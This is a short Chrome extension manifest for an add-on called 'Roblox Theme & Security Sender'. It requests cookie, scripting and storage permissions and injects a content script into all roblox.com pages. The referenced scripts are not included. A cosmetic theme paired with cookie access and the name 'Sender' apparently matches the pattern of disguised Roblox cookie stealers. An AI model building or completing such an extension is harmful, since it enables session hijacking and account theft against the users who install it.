{
  "manifest_version": 3,
  "name": "Roblox Theme & Security Sender",
  "version": "1.0",
  "permissions": [
    "cookies",
    "activeTab",
    "scripting",
    "storage"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_popup": "popup.html"
  },
  "content_scripts": [
    {
      "matches": ["*://*.roblox.com/*"],
      "js": ["content.js"]
    }
  ]
}
